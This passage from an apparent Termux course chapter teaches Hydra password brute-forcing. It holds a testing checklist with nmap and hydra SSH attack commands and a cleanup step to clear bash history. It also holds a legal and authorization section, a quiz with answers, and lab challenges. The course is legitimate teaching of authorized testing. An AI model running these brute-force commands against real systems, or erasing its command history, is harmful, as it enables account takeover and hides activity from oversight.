│  □ Confirm target is within scope                                       │
│  □ Document start time                                                  │
│                                                                          │
│  STEP 2: SERVICE ENUMERATION                                            │
│  ─────────────────────────────                                          │
│  □ Scan target with Nmap                                                │
│  □ Identify services and versions                                       │
│  □ Note open ports and protocols                                        │
│  $ nmap -sV -p 21,22,23,80,443,3306 target                             │
│                                                                          │
│  STEP 3: CREDENTIAL GATHERING                                           │
│  ─────────────────────────────                                          │
│  □ Check for default credentials                                        │
│  □ Identify valid usernames (from emails, LinkedIn, etc.)              │
│  □ Create targeted username list                                        │
│                                                                          │
│  STEP 4: QUICK WIN TEST                                                 │
│  ─────────────────────────                                              │
│  □ Test null passwords (-e n)                                           │
│  □ Test username as password (-e s)                                     │
│  □ Test reversed username (-e r)                                        │
│  $ hydra -L users.txt -e nsr ssh://target                              │
│                                                                          │
│  STEP 5: DICTIONARY ATTACK                                              │
│  ─────────────────────────                                              │
│  □ Select appropriate wordlist                                          │
│  □ Configure optimal threads                                            │
│  □ Enable logging and output                                            │
│  $ hydra -L users.txt -P rockyou.txt -t 4 -o output.txt ssh://target   │
│                                                                          │
│  STEP 6: ANALYSIS AND DOCUMENTATION                                     │
│  ───────────────────────────────                                        │
│  □ Review found credentials                                             │
│  □ Document timeline and methodology                                    │
│  □ Assess password strength findings                                    │
│  □ Prepare remediation recommendations                                  │
│                                                                          │
│  STEP 7: CLEANUP                                                        │
│  ─────────────                                                          │
│  □ Delete test files                                                    │
│  □ Clear bash history if needed                                         │
│  □ Document completion                                                  │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## ⚠️ LEGAL & ETHICS: Brute Force Specific Considerations

### Legal Framework for Password Testing

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    LEGAL CONSIDERATIONS FOR BRUTE FORCE                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  BEFORE TESTING:                                                        │
│  ────────────────                                                       │
│  □ Written authorization MUST include:                                  │
│    ├── Explicit permission for password testing                         │
│    ├── List of target IP addresses/hostnames                            │
│    ├── Specific services that can be tested                             │
│    ├── Account lockout acknowledgment                                   │
│    ├── Emergency contact for lockouts                                   │
│    └── Testing window (dates and times)                                 │
│                                                                          │
│  DURING TESTING:                                                        │
│  ────────────────                                                       │
│  □ Monitor for account lockouts                                         │
│  □ Stop immediately if production impact detected                       │
│  □ Document all activities with timestamps                             │
│  □ Stay within authorized scope                                         │
│  □ Use test accounts when possible                                      │
│                                                                          │
│  POTENTIAL CRIMES (Unauthorized Testing):                               │
│  ─────────────────────────────────────────                              │
│  ├── Computer Fraud and Abuse Act (CFAA) - USA                         │
│  ├── IT Act 2000 Section 66 - India                                     │
│  ├── Computer Misuse Act - UK                                           │
│  └── Similar laws in most countries                                     │
│                                                                          │
│  PENALTIES:                                                             │
│  ──────────                                                             │
│  ├── USA: Up to 10 years imprisonment                                   │
│  ├── India: Up to 3 years + ₹5 lakh fine                               │
│  ├── UK: Up to 5 years imprisonment                                     │
│  └── Civil lawsuits for damages                                         │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Authorization Document Template for Brute Force Testing

```
PASSWORD TESTING AUTHORIZATION
===============================

CLIENT: _________________________
TARGET SYSTEMS: __________________
TEST DATE(S): ____________________
TESTER: __________________________

SPECIFIC AUTHORIZATION:
I authorize password strength testing via brute force methods
on the following systems and services:

SYSTEM 1:
- Hostname/IP: __________________
- Services: SSH, FTP, HTTP
- Accounts to test: _____________
- Excluded accounts: ____________

LIMITATIONS:
- Maximum attempts per account: ______
- Testing hours: ________________
- Account lockout protocol: _________

EMERGENCY CONTACT: ________________
PHONE: ____________________________

CLIENT SIGNATURE: _________________ DATE: ________
TESTER SIGNATURE: _________________ DATE: ________
```

---

## 🔗 RELATED CHAPTERS

### Prerequisites
- **Chapter 30**: Security Tools Overview (Methodology, Legal Framework)
- **Chapter 11-20**: Linux Commands and Scripting

### Related Chapters
| Chapter | Title | Relationship |
|---------|-------|--------------|
| **32** | Hydra Advanced | Extended techniques, proxies |
| **33** | John the Ripper | Offline hash cracking |
| **34** | SQLMap Basics | Database attacks |
| **35** | Metasploit Framework | Exploitation framework |
| **38** | WiFi Security Tools | Wireless brute force |

---

## 🎮 INTERACTIVE QUIZ

### Test Your Hydra Knowledge

**Q1: What does the `-e nsr` flag do in Hydra?**
- A) Enables network speed reduction
- B) Tests null, same-as-username, and reversed passwords
- C) Sets normal scan rate
- D) Enables SSL connection

**Q2: Which protocol requires the lowest thread count for stable brute forcing?**
- A) FTP
- B) HTTP
- C) SSH
- D) Telnet

**Q3: What is the purpose of the `-f` flag?**
- A) Fast mode
- B) Force connection
- C) Exit on first successful credential
- D) File output mode

**Q4: How do you specify a custom port in Hydra?**
- A) `hydra -port 2222 target ssh`
- B) `hydra -s 2222 ssh://target`
- C) `hydra --port 2222 target ssh`
- D) `hydra target:2222 ssh`

**Q5: What does ^USER^ represent in HTTP form attacks?**
- A) Current username placeholder
- B) User agent string
- C) Admin username
- D) Current user's IP

**Q6: Which command saves output to a file?**
- A) `hydra -output file.txt`
- B) `hydra -o file.txt`
- C) `hydra --save file.txt`
- D) `hydra -w file.txt`

**Q7: How do you resume an interrupted Hydra session?**
- A) `hydra --continue`
- B) `hydra -resume`
- C) `hydra -R`
- D) `hydra --restart`

**Q8: What is the default number of parallel threads in Hydra?**
- A) 4
- B) 8
- C) 16
- D) 32

**Q9: Which flag is used for verbose output showing each attempt?**
- A) `-v`
- B) `-V`
- C) `-vV`
- D) `--verbose`

**Q10: What type of attack uses the `-C` option?**
- A) Custom attack
- B) Combo file attack (user:pass pairs)
- C) Continuous attack
- D) Cached credentials attack

**Q11: For HTTP POST form attacks, what comes after the failure string?**
- A) Username
- B) Password
- C) Nothing (it's the last parameter)
- D) Success string

**Q12: What is the recommended thread count for SSH brute forcing?**
- A) 1-2
- B) 4
- C) 16
- D) 32

<details>
<summary>📝 Click to Reveal Answers</summary>

1. **B** - Tests null, same-as-username, and reversed passwords
2. **C** - SSH (4 threads recommended)
3. **C** - Exit on first successful credential
4. **B** - `hydra -s 2222 ssh://target`
5. **A** - Current username placeholder
6. **B** - `hydra -o file.txt`
7. **C** - `hydra -R`
8. **C** - 16 threads default
9. **C** - `-vV` (verbose + show each attempt)
10. **B** - Combo file attack (user:pass pairs)
11. **C** - Nothing (failure string is the last parameter)
12. **B** - 4 threads recommended for SSH

</details>

---

## 🎯 ETHICAL HACKING CHALLENGES

### Challenge 1: Basic SSH Brute Force
- [ ] Set up a local SSH server (or use a lab VM)
- [ ] Create a small wordlist with known password
- [ ] Successfully brute force the SSH credentials
- [ ] Document the attack with output file

### Challenge 2: HTTP Form Attack
- [ ] Set up DVWA or similar vulnerable app
- [ ] Identify the login form parameters
- [ ] Determine the failure string
- [ ] Successfully brute force the login
- [ ] Capture and analyze the results

### Challenge 3: Custom Wordlist Creation
- [ ] Use Crunch to generate a pattern-based wordlist
- [ ] Create 1000 passwords matching pattern: Company@@@
- [ ] Test the wordlist against a test account
- [ ] Analyze time taken vs success rate

### Challenge 4: Multi-Service Attack
- [ ] Identify 3 services running on a lab target
- [ ] Create an attack plan for each service
- [ ] Execute attacks with proper documentation
- [ ] Write a summary of findings

---

## ✅ CHAPTER CHECKLIST

Before moving to Chapter 32, verify:

- [ ] Hydra installed successfully (`pkg install hydra -y`)
- [ ] Basic syntax understood (`-l`, `-L`, `-p`, `-P`, `-t`, `-vV`, `-o`)
- [ ] SSH attack syntax practiced
- [ ] FTP attack syntax practiced
- [ ] HTTP form attack syntax understood
- [ ] Wordlist downloaded (RockYou or similar)
- [ ] Crunch installed for wordlist generation
- [ ] Custom wordlist created
- [ ] Output file handling understood
- [ ] Legal and ethical implications understood
- [ ] Completed the interactive quiz
- [ ] Attempted at least 2 challenges

---

## 🎯 NEXT CHAPTER PREVIEW

**Chapter 32: Hydra - Advanced Techniques**

- Multi-service simultaneous attacks
- Performance optimization strategies
- Proxy and anonymity configuration
- Resume interrupted attacks
- Real-world scenarios and case studies
- Bypass techniques and evasion
- Integration with other tools
- Automated attack scripts

---

**Chapter Complete! 🎉**

*Created by T3rmuxk1ng | Termux Full Course*
